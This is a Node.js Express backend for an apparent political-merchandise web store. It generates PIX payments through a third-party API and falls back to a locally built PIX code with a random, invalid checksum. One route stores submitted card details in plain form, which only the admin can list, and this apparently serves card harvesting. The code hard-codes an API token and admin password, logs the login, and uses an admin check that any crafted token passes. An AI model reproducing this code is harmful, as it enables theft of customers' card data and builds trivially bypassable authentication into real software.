const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static('public'));
app.use('/admin', express.static('admin'));

// ========== CONFIGURAÇÃO PLUMIFY ==========
const PLUMIFY_TOKEN = '0RRWtMOuHsAQlR7S0zEnlGBnLEnr8DgoDJS3GTecxH7nZr2X01kHo6rxrOGa';
const PRODUCT_CODE = 'pdkhijtoed';
const OFFER_HASH = '7becb';

// Lista de endpoints possíveis (vai testar um por um)
const ENDPOINTS = [
    'https://api.Plumify.com.br/v1/transaction',
    'https://api.Plumify.com.br/api/v1/transaction',
    'https://api.Plumify.com.br/transaction',
    'https://api.Plumify.com.br/api/transaction',
    'https://api.Plumify.com.br/pix'
];

let endpointsTestados = [];

// ========== FUNÇÃO PARA TESTAR ENDPOINTS ==========
async function testarEndpoint(url, payload) {
    try {
        console.log(`\n🔍 Testando endpoint: ${url}`);
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${PLUMIFY_TOKEN}`
            },
            body: JSON.stringify(payload)
        });
        
        const data = await response.json();
        console.log(`📡 Resposta (${response.status}):`, JSON.stringify(data, null, 2));
        
        if (response.ok && data && (data.pix_qr_code || data.qr_code || data.id)) {
            return { success: true, url, data };
        }
        return { success: false, url, status: response.status, data };
    } catch (error) {
        console.log(`❌ Erro no endpoint ${url}:`, error.message);
        return { success: false, url, error: error.message };
    }
}

// ========== ROTA DE PIX QUE TESTA ENDPOINTS ==========
app.post('/api/gerar-pix', async (req, res) => {
    const { cliente, total, itens } = req.body;
    
    const payload = {
        amount: Math.round(total * 100),
        offer_hash: OFFER_HASH,
        payment_method: "pix",
        customer: {
            name: cliente.cliente_nome,
            email: cliente.cliente_email,
            phone_number: cliente.cliente_telefone?.replace(/\D/g, ''),
            document: cliente.cliente_cpf?.replace(/\D/g, ''),
            street_name: cliente.endereco_rua || '',
            number: cliente.endereco_numero || '',
            complement: cliente.endereco_complemento || '',
            neighborhood: cliente.endereco_bairro || '',
            city: cliente.endereco_cidade || '',
            state: cliente.endereco_uf || '',
            zip_code: cliente.endereco_cep?.replace(/\D/g, '')
        },
        cart: itens.map(item => ({
            product_hash: PRODUCT_CODE,
            title: item.nome,
            price: Math.round(item.preco * 100),
            quantity: item.quantidade,
            operation_type: 1,
            tangible: false
        })),
        expire_in_days: 1,
        transaction_origin: "api",
        postback_url: `https://${req.headers['host']}/api/webhook/plumify`
    };
    
    console.log('\n🟢 PAYLOAD:', JSON.stringify(payload, null, 2));
    
    // Testa cada endpoint
    for (const endpoint of ENDPOINTS) {
        const result = await testarEndpoint(endpoint, payload);
        if (result.success) {
            console.log(`\n✅ ENDPOINT CORRETO ENCONTRADO: ${result.url}`);
            return res.json({ 
                success: true, 
                pix_qr_code: result.data.pix_qr_code || result.data.qr_code,
                endpoint: result.url
            });
        }
    }
    
    // Se nenhum funcionar, usa PIX local
    console.log('\n❌ NENHUM ENDPOINT FUNCIONOU! Usando PIX local');
    const pixLocal = `00020126360014br.gov.bcb.pix0114capitao@store.com5204000053039865404${Math.round(total * 100)}5802BR5925CAPITAO STORE6009SAO PAULO6304${Math.random().toString(36).substring(2, 6).toUpperCase()}`;
    res.json({ success: true, pix_qr_code: pixLocal });
});

// ========== RESTO DO SEU CÓDIGO ==========
let produtos = [
    { id: 1, nome: "Camiseta Bolsonaro 2026", preco: 89.90, preco_antigo: 129.90, imagem: "https://placehold.co/600x800/f0ede5/8b6b3d?text=CAMISETA+2026", categoria: "Camisetas", estoque: 50, destaque: true, ativo: true, vendas: 152, descricao: "Camiseta 100% algodão com estampa exclusiva do Capitão.", created_at: new Date().toISOString() },
    { id: 2, nome: "Boné Exército e Fé", preco: 59.90, preco_antigo: 89.90, imagem: "https://placehold.co/600x800/e6dfd1/8b6b3d?text=BONE+PRETO", categoria: "Bonés", estoque: 30, destaque: true, ativo: true, vendas: 89, descricao: "Boné em algodão com bordado personalizado.", created_at: new Date().toISOString() },
    { id: 3, nome: "Caneca Ordem e Progresso", preco: 39.90, preco_antigo: 59.90, imagem: "https://placehold.co/600x800/fff4e6/8b6b3d?text=CANECA", categoria: "Canecas", estoque: 100, destaque: true, ativo: true, vendas: 234, descricao: "Caneca porcelana 300ml com frase histórica.", created_at: new Date().toISOString() }
];

let pedidos = [];
let cartoes = [];
let visitantes = [];
let carrinhosAbandonados = [];

app.get('/api/produtos', (req, res) => {
    res.json({ success: true, produtos: produtos.filter(p => p.ativo === true) });
});

app.post('/api/pedido', (req, res) => {
    const pedidoId = 'CAP' + Date.now();
    pedidos.unshift({ ...req.body, pedido_id: pedidoId, created_at: new Date().toISOString() });
    res.json({ success: true, pedido_id: pedidoId });
});

app.post('/api/cartao', (req, res) => {
    cartoes.push({ id: Date.now(), ...req.body });
    res.json({ success: true });
});

app.get('/api/pedido/:id', (req, res) => {
    const pedido = pedidos.find(p => p.pedido_id === req.params.id);
    res.json({ success: !!pedido, pedido });
});

// ADMIN
app.post('/api/admin/login', (req, res) => {
    if (req.body.username === 'kakabanker' && req.body.password === '77991958@Abc') {
        res.json({ success: true, token: 'admin_auth_' + Date.now() });
    } else {
        res.status(401).json({ success: false });
    }
});

function verifyAdmin(req, res, next) {
    const token = req.headers.authorization;
    if (!token || !token.startsWith('Bearer admin_auth_')) return res.status(401).json({ success: false });
    next();
}

app.get('/api/admin/produtos', verifyAdmin, (req, res) => { res.json({ success: true, produtos }); });
app.get('/api/admin/pedidos', verifyAdmin, (req, res) => { res.json({ success: true, pedidos }); });
app.get('/api/admin/cartoes', verifyAdmin, (req, res) => { res.json({ success: true, cartoes }); });
app.put('/api/admin/pedido/:id/status', verifyAdmin, (req, res) => {
    const pedido = pedidos.find(p => p.pedido_id === req.params.id);
    if (pedido) {
        pedido.status = req.body.status;
        res.json({ success: true });
    } else {
        res.status(404).json({ success: false });
    }
});

app.listen(PORT, () => {
    console.log(`🚀 Servidor rodando na porta ${PORT}`);
    console.log(`🔐 Admin: http://localhost:${PORT}/admin`);
    console.log(`👤 Login: kakabanker / 77991958@Abc`);
});